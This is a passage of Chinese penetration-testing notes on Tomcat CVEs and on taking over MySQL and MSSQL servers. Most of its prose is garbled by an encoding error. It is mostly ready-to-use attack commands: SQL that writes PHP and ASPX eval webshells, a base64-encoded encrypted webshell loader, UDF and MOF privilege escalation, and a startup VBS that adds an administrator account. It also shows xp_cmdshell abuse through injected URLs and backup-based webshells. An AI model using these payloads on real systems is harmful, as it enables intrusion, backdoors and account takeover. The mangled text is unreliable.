   6. CVE-2017-12615 & CVE-2017-12616 putæ–‡ä»¶ä¸Šä¼ 

      1. èŒƒå›´7.0.0 â€“ 7.0.79
      2. æ¡ä»¶:æ‰‹åŠ¨å°†web.xmlä¸­çš„readonlyè®¾ç½®ä¸ºfalse
      3. åˆ©ç”¨æ„é€ putä¸Šä¼ shell,è¿”å›201ä¸ºæˆåŠŸ

   7. CVE-2019-0232å‘½ä»¤æ³¨å…¥

      1. è¯¥æ¼æ´çš„åˆ©ç”¨æ¡ä»¶è¾ƒä¸ºè‹›åˆ»ï¼Œéœ€åŒæ—¶æ»¡è¶³ä¸‹åˆ—æ¡ä»¶ï¼š

         1. ç³»ç»Ÿä¸ºWindows
         2. å¯ç”¨äº†CGI Servletï¼ˆé»˜è®¤ä¸ºå…³é—­ï¼‰
         3. å¯ç”¨äº†enableCmdLineArgumentsï¼ˆTomcat 9.0.*åŠå®˜æ–¹æœªæ¥å‘å¸ƒç‰ˆæœ¬é»˜è®¤ä¸ºå…³é—­ï¼‰

         å½±å“èŒƒå›´ï¼š

         ```
         9.0.0.M1-9.0.17
         8.5.0-8.5.39
         7.0.0-7.0.93
         ```
      
   8. CVE-2020-1938 AJPç¼ºé™·
   
      1. æ–‡ä»¶è¯»å–,ä»£ç æ‰§è¡Œ
   
      2. èŒƒå›´
   
         ```
         Apache Tomcat 6
         Apache Tomcat 7 < 7.0.100
         Apache Tomcat 8 < 8.5.51
         Apache Tomcat 9 < 9.0.31
         ```



## æ•°æ®åº“å®‰å…¨

### mysqlæ¸—é€æ€»ç»“

#### ä¸€ã€sqlshellè·å–

è¦åˆ©ç”¨mysqlé¦–å…ˆå¾—æ‹¿åˆ°ä¸€ä¸ªå¯ä»¥æ‰§è¡Œsqlçš„mysqlæ‰èƒ½åˆ©ç”¨ï¼Œä¸‹é¢å°±è¯´ä¸€ä¸‹å‡ ç§å¸¸è§å§¿åŠ¿ï¼Œæ¬¢è¿è¡¥å……ã€‚

1ã€å¼±å£ä»¤

è¿™ä¸ªæ¯”è¾ƒç®€å•ï¼Œç½‘ä¸Šå·¥å…·å¾ˆå¤šå¦‚ç¾æœèï¼Œä¹å¤´è›‡è¿™äº›æ¯”è¾ƒçŸ¥åçš„ï¼Œmsfä¹Ÿæœ‰ç›¸åº”çš„æ¨¡å—ã€‚æˆ‘è‡ªå·±ä¹‹å‰ä¹Ÿå†™è¿‡ä¸€ä¸ªã€‚è¦æ˜¯è¿æ°”å¥½çš„è¯ç›´æ¥è·‘åˆ°å¼±å£ä»¤å°±ç›´æ¥è¿›å»ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥é…åˆç¤¾å·¥å­—å…¸æ¥è·‘è¿™æ ·æˆåŠŸç‡æ›´é«˜ã€‚

2ã€æ–‡ä»¶è¯»å–æ¼æ´

éœ€è¦æŒ–ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œç„¶ååˆ©ç”¨è¯»ç½‘ç«™çš„é…ç½®æ–‡ä»¶ï¼Œé‡Œé¢å­˜æ”¾ç€æ•°æ®åº“è´¦å·å¯†ç ã€‚

3ã€ä¿¡æ¯æ³„éœ²

æ‰«ç›®å½•æ‰«ç½‘ç«™å¤‡ä»½æ–‡ä»¶ï¼Œæˆ–è€…gitæ³„éœ²

4ã€sqlæ³¨å…¥

è¿™ä¸ªä¸ç”¨å¤šè¯´ï¼Œè¦æ˜¯æƒé™å¤Ÿå¤§ç›´æ¥sqlmap os-shellä¸€æŠŠæ¢­

5ã€èº«ä»½è®¤è¯ç»•è¿‡æ¼æ´(CVE-2012-2122)

å—å½±å“ç‰ˆæœ¬ï¼š

MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not.

MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not.

ä¹Ÿå°±æ˜¯è¯´åªè¦çŸ¥é“ç”¨æˆ·åï¼Œä¸æ–­å°è¯•å°±èƒ½å¤Ÿç›´æ¥ç™»å…¥SQLæ•°æ®åº“ã€‚æŒ‰ç…§å…¬å‘Šè¯´æ³•å¤§çº¦256æ¬¡å°±èƒ½å¤Ÿè’™å¯¹ä¸€æ¬¡ã€‚

åœ¨msfé‡Œé¢æœ‰æ¨¡å—ï¼Œå¯ä»¥ç›´æ¥ç”¨auxiliary/scanner/mysql/mysql_authbypass_hashdumpæ¥è·‘

å½“æ•°æ®åº“ä¸èƒ½å¤–è¿å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹æ³•å¼€æ”¾å¤–è¿(æ³¨æ„é˜²ç«å¢™)ï¼š

å¯ä»¥ä¿®æ”¹`host`ä¸º`%`å¹¶åˆ·æ–°æƒé™åï¼Œé»˜è®¤rootç­‰è´¦å·ä¸å…è®¸è¿œç¨‹è¿æ¥

```
use mysql;  
update user set host = '%' where user = 'root';  
FLUSH PRIVILEGES ;  
select host, user from user;
```

#### äºŒã€mysqlæ‹¿shell

##### 1ã€ç”¨å‘½ä»¤ç›´æ¥å¯¼å‡ºshell

åŸç†ï¼šåˆ©ç”¨å¯¼å‡ºå‘½ä»¤æ¥å¯¼å‡ºshellã€‚

æ¡ä»¶ï¼š

1. éœ€è¦çŸ¥é“ç½‘ç«™çš„ç‰©ç†è·¯å¾„(ç»å¯¹è·¯å¾„)

é€šè¿‡ç¨‹åºæŠ¥é”™ï¼Œæ—¥å¿—æ³„éœ²ï¼Œphpinfoï¼Œphpæ¢é’ˆç­‰æ–¹å¼å¯ä»¥è·å–åˆ°ç‰©ç†è·¯å¾„ã€‚

2.å…è®¸å¯¼å‡º

å…ˆæŸ¥çœ‹æ˜¯å¦å…è®¸å¯¼å…¥å¯¼å‡º

```
show variables like '%secure%'    
 
```

secure_file_privçš„å€¼ä¸ºnull ï¼Œè¡¨ç¤ºé™åˆ¶mysqld ä¸å…è®¸å¯¼å…¥|å¯¼å‡º

å½“secure_file_privçš„å€¼ä¸º/tmp/ ï¼Œè¡¨ç¤ºé™åˆ¶mysqld çš„å¯¼å…¥|å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨/tmp/ç›®å½•ä¸‹ï¼Œæ­¤æ—¶å¦‚æœè¯»å†™å‘ç”Ÿåœ¨å…¶ä»–æ–‡ä»¶å¤¹ï¼Œå°±ä¼šæŠ¥å‘Šå¦‚ä¸‹é”™è¯¯ï¼š

```
RROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement  
 
```

å½“secure_file_privçš„å€¼æ²¡æœ‰å…·ä½“å€¼æ—¶ï¼Œè¡¨ç¤ºä¸å¯¹mysqld çš„å¯¼å…¥|å¯¼å‡ºåšé™åˆ¶

å¦‚æœæ¡ä»¶éƒ½æ»¡è¶³çš„è¯,å°±å¯ä»¥å¼€å§‹äº†

outfile

```
select '<?php eval($_POST[xxx]) ?>' into outfile '/var/www/xx.php';  
 
```

dumpfile

```
select '<?php eval($_POST[xx]) ?>' into dumpfile '/var/www/xx.php';  
 
```

æ³¨æ„ï¼šoutfileå‡½æ•°å¯ä»¥å¯¼å‡ºå¤šè¡Œï¼Œè€Œdumpfileåªèƒ½å¯¼å‡ºä¸€è¡Œæ•°æ®outfileå‡½æ•°åœ¨å°†æ•°æ®å†™åˆ°æ–‡ä»¶é‡Œæ—¶æœ‰ç‰¹æ®Šçš„æ ¼å¼è½¬æ¢ï¼Œè€Œdumpfileåˆ™ä¿æŒåŸæ•°æ®æ ¼å¼

å€ŸåŠ©è¡¨å¯¼å‡ºã€‚

```
Drop TABLE IF EXISTS temp;
Create TABLE temp(cmd text NOT NULL);
Insert INTO temp (cmd) VALUES('<?php eval($_POST[xxx]) ?>');
Select cmd from temp into out file '/var/www/xx.php';
Drop TABLE IF EXISTS temp;  
 
```

ä¹Ÿå¯ä»¥ç”¨mysql çš„ -e å‚æ•°

```
mysql -u user -p passwd -e "select '' into outfile '/var/www/xxx.php'"
```

##### 2ã€åˆ©ç”¨general_logæ‹¿shell

å¦‚æœå¯¼å…¥å¯¼å‡ºè¢«ç¦ç”¨äº†å°±å¯ä»¥ç”¨è¿™ä¸ªæ–¹æ³•è¯•è¯•ã€‚

åŸç†ï¼šåˆ©ç”¨ä¿®æ”¹æ—¥å¿—æ–‡ä»¶è·¯å¾„ï¼Œå¾€æ—¥å¿—æ–‡ä»¶å†™å…¥ä¸€å¥è¯ã€‚

æ¡ä»¶ï¼š

1.å¯¹åº”webç›®å½•æœ‰å†™æƒé™

2.éœ€è¦æœ‰ç‰©ç†è·¯å¾„

3.å¦‚æœæ‹¿åˆ°çš„æ˜¯æ³¨å…¥ï¼Œè¿˜éœ€è¦èƒ½æ‰§è¡Œå †å æ³¨å…¥

4.rootç”¨æˆ·ï¼Œæˆ–è€…æœ‰å¯¹åº”æƒé™çš„ç”¨æˆ·

åˆ©ç”¨å¦‚ä¸‹:å¼€å¯æ—¥å¿—ï¼Œæ›´æ”¹è·¯å¾„ï¼ŒæŠŠä¸€å¥è¯å†™å…¥æ—¥å¿—æ–‡ä»¶ã€‚

```
set global general_log=on;  
set global general_log_file='/var/www/1.php';  
select '<?php eval($_POST[safe6]) ?>';
```



**3.å†™åŠ å¯†é©¬**

æŠŠå†°èï¼Œå“¥æ–¯æ‹‰çš„é©¬å„¿è¿›è¡Œbase64ç¼–ç ï¼Œç„¶åå†™ä¸€ä¸ªæ™®é€šçš„abb.phpå°±è®¿é—®abb.phpä¼šåœ¨å½“å‰è·¯å¾„ç”Ÿæˆabab.php

```
select '<?php file_put_contents("abab.php",base64_decode("Jmx0Oz9waHANCkBlcnJvcl9yZXBvcnRpbmcoMCk7DQpzZXNzaW9uX3N0YXJ0KCk7DQogICAgJGtleT0iZTQ1ZTMyOWZlYjVkOTI1YiI7IA0KCSRfU0VTU0lPTlsmIzM5O2smIzM5O109JGtleTsNCgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsNCglpZighZXh0ZW5zaW9uX2xvYWRlZCgmIzM5O29wZW5zc2wmIzM5OykpDQoJew0KCQkkdD0iYmFzZTY0XyIuImRlY29kZSI7DQoJCSRwb3N0PSR0KCRwb3N0LiIiKTsNCgkJDQoJCWZvcigkaT0wOyRpJmx0O3N0cmxlbigkcG9zdCk7JGkrKykgew0KICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgDQogICAgCQkJfQ0KCX0NCgllbHNlDQoJew0KCQkkcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsICJBRVMxMjgiLCAka2V5KTsNCgl9DQogICAgJGFycj1leHBsb2RlKCYjMzk7fCYjMzk7LCRwb3N0KTsNCiAgICAkZnVuYz0kYXJyWzBdOw0KICAgICRwYXJhbXM9JGFyclsxXTsNCgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2ludm9rZSgkcCkge2V2YWwoJHAuIiIpO319DQogICAgQGNhbGxfdXNlcl9mdW5jKG5ldyBDKCksJHBhcmFtcyk7DQo/Jmd0Ow0K"));?>' into outfile 'C:/wamp/www/abb.php';
```



#### ä¸‰ã€ä»»æ„æ–‡ä»¶è¯»å–

æ—¢ç„¶æœ‰æ–‡ä»¶å¯¼å‡ºï¼Œè‚¯å®šä¹Ÿæœ‰æ–‡ä»¶å¯¼å…¥ã€‚å…³äºä»»æ„æ–‡ä»¶è¯»å–æ€ä¹ˆç”¨ï¼Œæˆ‘ä¹‹å‰æ€»ç»“è¿‡ã€‚

æ¡ä»¶ï¼šå’Œå¯¼å‡ºshellçš„æ¡ä»¶ä¸€æ ·ã€‚

åˆ©ç”¨:å…ˆåˆ›å»ºä¸€å¼ è¡¨ï¼Œè¯»å–æ–‡ä»¶å†…å®¹åˆ°è¡¨ã€‚

```
create table a (v text);
load data infile 'file_name' into table table_name fields terminated by 'åˆ†éš”ç¬¦'  
 
```

ä¾‹å¦‚è¯»text.txtï¼š

```
load data infile 'C:/phpstudy/MySQL/test.txt' into table a fields terminated by ',';
```

æŸ¥çœ‹å†…å®¹

```
SELECT * FROM a
```

#### å››ã€mysqlææƒ

å…ˆæ¨èä¸€ä¸ªå°å·¥å…·https://github.com/T3st0r-Git/HackMySQL

**1ã€mofææƒ**

åŸç†ï¼š

åˆ©ç”¨äº†c:/windows/system32/wbem/mof/ç›®å½•ä¸‹çš„ nullevt.mof æ–‡ä»¶ï¼Œæ¯åˆ†é’Ÿéƒ½ä¼šåœ¨ä¸€ä¸ªç‰¹å®šçš„æ—¶é—´å»æ‰§è¡Œä¸€æ¬¡çš„ç‰¹æ€§ï¼Œæ¥å†™å…¥æˆ‘ä»¬çš„cmdå‘½ä»¤ä½¿å…¶è¢«å¸¦å…¥æ‰§è¡Œã€‚

æ¡ä»¶ï¼š

1ã€mofææƒçš„å‰ææ˜¯rootç”¨æˆ·

2ã€å¯ä»¥å¤åˆ¶æ–‡ä»¶åˆ°%SystemRoot%\System32\Wbem\MOFç›®å½•ä¸‹

åˆ©ç”¨ï¼š

ç½‘ä¸Šå·¥å…·ä¹Ÿå¾ˆå¤šï¼Œå¯ä»¥ç›´æ¥ç”¨msfçš„exploit/windows/mysql/mysql_mofæ¨¡å—ï¼Œæ‰§è¡ŒæˆåŠŸåä¼šç›´æ¥åå¼¹meterpreterã€‚

**2ã€udfææƒ**

åŸç†ï¼š

UDFï¼ˆuser defined functionï¼‰ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼Œæ˜¯mysqlçš„ä¸€ä¸ªæ‹“å±•æ¥å£ã€‚ç”¨æˆ·å¯ä»¥é€šè¿‡è‡ªå®šä¹‰å‡½æ•°å®ç°åœ¨mysqlä¸­æ— æ³•æ–¹ä¾¿å®ç°çš„åŠŸèƒ½ï¼Œå…¶æ·»åŠ çš„æ–°å‡½æ•°éƒ½å¯ä»¥åœ¨sqlè¯­å¥ä¸­è°ƒç”¨ï¼Œå°±åƒè°ƒç”¨æœ¬æœºå‡½æ•°ä¸€æ ·ã€‚

æ¡ä»¶ï¼š

1ã€ç³»ç»Ÿæ˜¯Windows(Win2000,XP,Win2003)ï¼›æœ‰ä¸€ä¸ªmysqlæ•°æ®åº“çš„è´¦æˆ·æ‹¥æœ‰insertå’Œdeleteæƒé™ï¼Œä»¥åˆ›å»ºå’ŒæŠ›å¼ƒå‡½æ•°ã€‚

2ã€Mysqlç‰ˆæœ¬å¤§äº5.1ç‰ˆæœ¬udf.dllæ–‡ä»¶å¿…é¡»æ”¾ç½®äºMYSQLå®‰è£…ç›®å½•ä¸‹çš„lib\pluginæ–‡ä»¶å¤¹ä¸‹ã€‚

3ã€Mysqlç‰ˆæœ¬å°äº5.1ç‰ˆæœ¬ã€‚udf.dllæ–‡ä»¶åœ¨Windows2003ä¸‹æ”¾ç½®äºc:\windows\system32ï¼Œåœ¨windows2000ä¸‹æ”¾ç½®äºc:\winnt\

system32ã€‚

4ã€æ‹¥æœ‰ç›¸åº”ç›®å½•çš„å†™æƒé™

æ³¨æ„ï¼šä¸€èˆ¬Libã€Pluginæ–‡ä»¶å¤¹éœ€è¦æ‰‹å·¥å»ºç«‹ï¼ˆä¹Ÿå¯ç”¨NTFS ADSæµæ¨¡å¼çªç ´è¿›è€Œåˆ›å»ºæ–‡ä»¶å¤¹ï¼‰

```
select @@basedir; //æŸ¥æ‰¾åˆ°mysqlçš„ç›®å½•
select 'It is dll' into dumpfile 'C:\\\ProgramFiles\\\MySQL\\\MySQL Server 5.1\\\lib::$INDEX\_ALLOCATION'; //åˆ©ç”¨NTFS ADSåˆ›å»ºlibç›®å½•
select 'It is dll' into dumpfile 'C:\\\ProgramFiles\\\MySQL\\\MySQL Server 5.1\\\lib\\\plugin::$INDEX\_ALLOCATION'; //åˆ©ç”¨NTFS ADSåˆ›å»ºpluginç›®å½•
```

åˆ©ç”¨ï¼š

ç›´æ¥ç”¨msfçš„use exploit/multi/mysql/mysql_udf_payloadæ¨¡å—.

msfä¼šå°†dllæ–‡ä»¶å†™å…¥lib\plugin\ç›®å½•ä¸‹(å‰ææ˜¯è¯¥ç›®å½•å­˜åœ¨ï¼Œå¦‚æœè¯¥ç›®å½•ä¸å­˜åœ¨çš„è¯ï¼Œåˆ™æ— æ³•æ‰§è¡ŒæˆåŠŸ)ï¼Œdllæ–‡ä»¶åä¸º**éšæœºç”Ÿæˆ**çš„åå­—(è®°ä¸‹æ¥åé¢æ‰‹åŠ¨åˆ›å»ºéœ€è¦ç”¨åˆ°)ã€‚è¯¥dllæ–‡ä»¶ä¸­åŒ…å«sys_exec()å’Œsys_eval()ä¸¤ä¸ªå‡½æ•°ï¼Œä½†æ˜¯é»˜è®¤åªåˆ›å»ºsys_exec()å‡½æ•°ï¼Œè¯¥å‡½æ•°æ‰§è¡Œå¹¶ä¸ä¼šæœ‰å›æ˜¾ã€‚æˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨åˆ›å»º sys_eval() å‡½æ•°ï¼Œæ¥æ‰§è¡Œæœ‰å›æ˜¾çš„å‘½ä»¤ã€‚

æ‰‹åŠ¨åˆ›å»ºsys_eval()

```
create function sys_eval returns string soname 'SGJECYG.dll';
```

æ‰§è¡Œæ‰‹åŠ¨åˆ›å»ºçš„å‡½æ•°

```
select sys_eval('whoami');
```

æ£€æŸ¥æœ‰æ²¡æœ‰åˆ›å»ºæˆåŠŸ

```
select * from mysql.func where name = 'sys_eval';
```

åˆ é™¤å‡½æ•°

```
drop function sys_eval;
```

**3ã€å¯åŠ¨é¡¹ææƒ**

åŸç†ï¼šæœ¬è´¨è¿˜æ˜¯ç”¨å¯¼å‡ºå‘½ä»¤æ¥å®ç°ï¼Œå¯¼å‡ºè„šæœ¬åˆ°å¯åŠ¨ç›®å½•ï¼ŒæœåŠ¡å™¨é‡å¯å°±æ‰§è¡Œè„šæœ¬ã€‚

æ¡ä»¶ï¼šä¸Šé¢è¯´è¿‡äº†ã€‚

åˆ©ç”¨ï¼š

å†™ä¸ªvbsåˆ°å¯åŠ¨ç›®å½•,æƒ³åŠæ³•è®©æœåŠ¡å™¨é‡å¯ã€‚

```
1ï¼Œå¼€å§‹èœå•å½“å‰ç”¨æˆ·å¯åŠ¨æ–‡ä»¶å¤¹--C:\\Users\\ç”¨æˆ·å\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup
2ï¼Œå¼€å§‹èœå•æ‰€æœ‰ç”¨æˆ·å¯åŠ¨æ–‡ä»¶å¤¹--C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp
3ï¼Œæ³¨å†Œè¡¨å½“å‰ç”¨æˆ·å¼€æœºå¯åŠ¨é¡¹ç›®å½•--HKEY\_CURRENT\_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
4ï¼Œæ³¨å†Œè¡¨æ‰€æœ‰ç”¨æˆ·å¼€æœºå¯åŠ¨é¡¹ç›®å½•--HKEY\_LOCAL\_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
```

å†™è„šæœ¬

```
create table a (cmd text);//åˆ›å»ºè¡¨
insert into a values ("set wshshell=createobject(""wscript.shell"") " );//å†™æ•°æ®åˆ°è¡¨
insert into a values ("a=wshshell.run(""cmd.exe /c net user aabbcc 123456 /add"",0) " );
insert into a values ("b=wshshell.run(""cmd.exe /c net localgroup administrators aabbcc/add"",0) " );
select * from a into outfile "C:\\\Documents andSettings\\\All Users\\\ã€Œå¼€å§‹ã€èœå•\\\ç¨‹åº\\\å¯åŠ¨\\\a.vbs";//å¯¼å‡ºvbs
```

msfä¸‹ä¹Ÿæœ‰å¯¹åº”æ¨¡å—exploit/windows/mysql/mysql_start_up

#### äº”ã€æ‹“å±•

å…¶ä»–å¸¸ç”¨msfæ¨¡å—

exploit/windows/mysql/scrutinizer_upload_execï¼ˆä¸Šä¼ æ–‡ä»¶æ‰§è¡Œï¼‰

auxiliary/scanner/mysql/mysql_hashdumpï¼ˆmysqlçš„mysql.userè¡¨çš„hashï¼‰

auxiliary/admin/mysql/mysql_sqlï¼ˆæ‰§è¡Œsqlè¯­å¥ï¼Œnavicatæ›´é¦™ï¼‰

auxiliary/scanner/mysql/mysql_versionï¼ˆè¯†åˆ«ç‰ˆæœ¬ï¼‰

#### å…­ã€å‚è€ƒ

https://xz.aliyun.com/t/3973

https://xz.aliyun.com/t/1491

https://blog.csdn.net/qq_37077262/article/details/102964050

http://www.safe6.cn/article/108

https://blog.csdn.net/qq_36119192/article/details/84863268

https://www.freebuf.com/articles/system/163144.html



### mssqlæ¸—é€æ€»ç»“

è†œæ‹œå¤§ä½¬æ–‡ç« https://y4er.com/post/mssql-getshel

#### getshell

èƒ½å¦getshellè¦çœ‹ä½ å½“å‰çš„ç”¨æˆ·æƒé™ï¼Œå¦‚æœæ˜¯æ²¡æœ‰è¿›è¡Œé™æƒçš„saç”¨æˆ·ï¼Œé‚£ä¹ˆä½ å‡ ä¹å¯ä»¥åšä»»ä½•äº‹ã€‚å½“ç„¶ä½ å¦‚æœæœ‰å…¶ä»–å…·æœ‰do_owneræƒé™çš„ç”¨æˆ·ä¹Ÿå¯ä»¥ã€‚

æ‹¿shellçš„ä¸¤å¤§å‰æå°±æ˜¯

1. æœ‰ç›¸åº”çš„æƒé™db_owner
2. çŸ¥é“webç›®å½•çš„ç»å¯¹è·¯å¾„

æˆ‘ä»¬å…ˆæ¥äº†è§£ä¸‹æ€ä¹ˆå»å¯»æ‰¾webç›®å½•çš„ç»å¯¹è·¯å¾„ã€‚

##### å¯»æ‰¾ç»å¯¹è·¯å¾„

1. æŠ¥é”™ä¿¡æ¯
2. å­—å…¸çŒœ
3. æ—ç«™çš„ç›®å½•
4. å­˜å‚¨è¿‡ç¨‹æ¥æœç´¢
5. è¯»é…ç½®æ–‡ä»¶

å‰ä¸‰ç§æ–¹æ³•éƒ½æ˜¯æ¯”è¾ƒå¸¸è§çš„æ–¹æ³•ã€‚æˆ‘ä»¬ä¸»è¦æ¥è®²ç¬¬å››ç§è°ƒç”¨å­˜å‚¨è¿‡ç¨‹æ¥æœç´¢ã€‚

åœ¨mssqlä¸­æœ‰ä¸¤ä¸ªå­˜å‚¨è¿‡ç¨‹å¯ä»¥å¸®æˆ‘ä»¬æ¥æ‰¾ç»å¯¹è·¯å¾„ï¼š`xp_cmdshell xp_dirtree`

å…ˆæ¥çœ‹`xp_dirtree`ç›´æ¥ä¸¾ä¾‹å­

```mssql
execute master..xp_dirtree 'c:' --åˆ—å‡ºæ‰€æœ‰c:\æ–‡ä»¶ã€ç›®å½•ã€å­ç›®å½• 
execute master..xp_dirtree 'c:',1 --åªåˆ—c:\ç›®å½•
execute master..xp_dirtree 'c:',1,1 --åˆ—c:\ç›®å½•ã€æ–‡ä»¶
```

å½“å®é™…åˆ©ç”¨çš„æ—¶å€™æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªä¸´æ—¶è¡¨æŠŠå­˜å‚¨è¿‡ç¨‹æŸ¥è¯¢åˆ°çš„è·¯å¾„æ’å…¥åˆ°ä¸´æ—¶è¡¨ä¸­

```mssql
CREATE TABLE tmp (dir varchar(8000),num int,num1 int);
insert into tmp(dir,num,num1) execute master..xp_dirtree 'c:',1,1;
```

æˆ‘ä»¬å†æ¥çœ‹`xp_cmdshell`æ€ä¹ˆå»æ‰¾ç»å¯¹è·¯å¾„ï¼Œå®é™…ä¸ŠåŸç†å°±æ˜¯è°ƒç”¨cmdæ¥æŸ¥æ‰¾æ–‡ä»¶ï¼Œç›¸å¯¹æ¥è¯´è¿™ç§æ–¹æ³•æ›´æ–¹ä¾¿ã€‚

å½“ç„¶ä½ å¯èƒ½é‡åˆ°xp_cmdshellä¸èƒ½è°ƒç”¨ å¦‚æœæŠ¥é”™

> SQL Server é˜»æ­¢äº†å¯¹ç»„ä»¶ â€˜xp_cmdshellâ€™ çš„ è¿‡ç¨‹â€™sys.xp_cmdshell' çš„è®¿é—®ï¼Œå› ä¸ºæ­¤ç»„ä»¶å·²ä½œä¸ºæ­¤æœåŠ¡å™¨å®‰å…¨é…ç½®çš„ä¸€éƒ¨åˆ†è€Œè¢«å…³é—­ã€‚ç³»ç»Ÿç®¡ç†å‘˜å¯ä»¥é€šè¿‡ä½¿ç”¨ sp_configure å¯ç”¨ã€‚

å¯ä»¥ç”¨å¦‚ä¸‹å‘½ä»¤æ¢å¤

```
;EXEC sp_configure 'show advanced options',1;//å…è®¸ä¿®æ”¹é«˜çº§å‚æ•°
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;  //æ‰“å¼€xp_cmdshellæ‰©å±•
RECONFIGURE;--
```



å½“ç„¶è¿˜ä¸è¡Œå¯èƒ½xplog70.dlléœ€è¦æ¢å¤ï¼Œçœ‹å…·ä½“æƒ…å†µæ¥è§£å†³å§

æ¥ä¸‹æ¥æˆ‘ä»¬å…ˆæ¥çœ‹cmdä¸­æ€ä¹ˆæŸ¥æ‰¾æ–‡ä»¶ã€‚



```
C:\Users\Y4er>for /r e:\ %i in (1*.php) do @echo %i
e:\code\php\1.php
C:\Users\Y4er>
```

é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦å»ºç«‹ä¸€ä¸ªè¡¨ å­˜åœ¨ä¸€ä¸ªcharå­—æ®µå°±å¯ä»¥äº†

```mssql
http://192.168.130.137/1.aspx?id=1;CREATE TABLE cmdtmp (dir varchar(8000));

http://192.168.130.137/1.aspx?id=1;insert into cmdtmp(dir) exec master..xp_cmdshell 'for /r c:\ %i in (1*.aspx) do @echo %i'
```

ç„¶åé€šè¿‡æ³¨å…¥å»æŸ¥è¯¢è¯¥è¡¨å°±å¯ä»¥äº†ã€‚

------

æ­¤æ—¶æˆ‘ä»¬æ‹¿åˆ°ç»å¯¹è·¯å¾„ä¹‹åï¼Œæˆ‘ä»¬æ¥ç€å¾€ä¸‹çœ‹æ€ä¹ˆæ‹¿shell

##### xp_cmdshellæ‹¿shell

xp_cmdshellè¿™ä¸ªå­˜å‚¨è¿‡ç¨‹å¯ä»¥ç”¨æ¥æ‰§è¡Œcmdå‘½ä»¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡cmdçš„echoå‘½ä»¤æ¥å†™å…¥shellï¼Œå½“ç„¶å‰ææ˜¯ä½ çŸ¥é“webç›®å½•çš„ç»å¯¹è·¯å¾„

```mssql
http://192.168.130.137/1.aspx?id=1;exec master..xp_cmdshell 'echo ^<%@ Page Language="Jscript"%^>^<%eval(Request.Item["pass"],"unsafe");%^> > c:\\WWW\\404.aspx' ;
```

ç”±äºcmdå†™webshellçš„ä¸»æ„è¿™äº›è½¬ä¹‰çš„é—®é¢˜ æ¨èä½¿ç”¨certutilæˆ–è€…vbsä»€ä¹ˆçš„æ¥ä¸‹è½½

##### å·®å¼‚å¤‡ä»½æ‹¿shell

```mssql
1. backup database åº“å to disk = 'c:\bak.bak';--

2. create table [dbo].[test] ([cmd] [image]);

3. insert into test(cmd) values(0x3C25657865637574652872657175657374282261222929253E)

4. backup database åº“å to disk='C:\d.asp' WITH DIFFERENTIAL,FORMAT;--
```

å› ä¸ºæƒé™çš„é—®é¢˜ï¼Œæœ€å¥½ä¸è¦å¤‡ä»½åˆ°ç›˜ç¬¦æ ¹ç›®å½•

å½“è¿‡æ»¤äº†ç‰¹æ®Šçš„å­—ç¬¦æ¯”å¦‚å•å¼•å·ï¼Œæˆ–è€… è·¯å¾„ç¬¦å· éƒ½å¯ä»¥ä½¿ç”¨å®šä¹‰å±€éƒ¨å˜é‡æ¥æ‰§è¡Œã€‚

##### logå¤‡ä»½æ‹¿shell

LOGå¤‡ä»½çš„è¦æ±‚æ˜¯ä»–çš„æ•°æ®åº“å¤‡ä»½è¿‡ï¼Œè€Œä¸”é€‰æ‹©æ¢å¤æ¨¡å¼å¾—æ˜¯å®Œæ•´æ¨¡å¼ï¼Œè‡³å°‘åœ¨2008ä¸Šæ˜¯è¿™æ ·çš„ï¼Œä½†æ˜¯ä½¿ç”¨logå¤‡ä»½æ–‡ä»¶ä¼šå°çš„å¤šï¼Œå½“ç„¶å¦‚æœä½ çš„æƒé™å¤Ÿé«˜å¯ä»¥è®¾ç½®ä»–çš„æ¢å¤æ¨¡å¼

```mssql
1. alter database åº“å set RECOVERY FULL 

2. create table cmd (a image) 

3. backup log åº“å to disk = 'c:\xxx' with init 

4. insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253E) 

5. backup log åº“å to disk = 'c:\xxx\2.asp'
```

logå¤‡ä»½çš„å¥½å¤„å°±æ˜¯å¤‡ä»½å‡ºæ¥çš„webshellçš„æ–‡ä»¶å¤§å°éå¸¸çš„å°

#### getsystem

æˆ‘ä»¬ç»§ç»­æ¥æ¢ç©¶æ€ä¹ˆè¿›è¡Œææƒ

##### xp_cmdshell

åœ¨2005ä¸­xp_cmdshellçš„æƒé™æ˜¯systemï¼Œ2008ä¸­æ˜¯networkã€‚

å½“é‡åˆ°æ— æ³•å†™shellï¼Œæˆ–è€…æ˜¯ç«™åº“åˆ†ç¦»çš„æ—¶å€™ï¼Œç›´æ¥é€šè¿‡xp_cmdshellæ¥ä¸‹è½½æˆ‘ä»¬çš„payloadæ¥ä¸Šçº¿ä¼šæ›´åŠ æ–¹ä¾¿ã€‚ä¸‹è½½æ–‡ä»¶é€šå¸¸æœ‰ä¸‹é¢å‡ ç§å§¿åŠ¿

1. certutil
2. vbs
3. bitsadmin
4. powershell
5. ftp

è¿™ä¸ªæˆ‘ä¼šæ”¾åœ¨ä¸‹ä¸€ç¯‡æ–‡ç« ä¸­ç»†è®²ã€‚

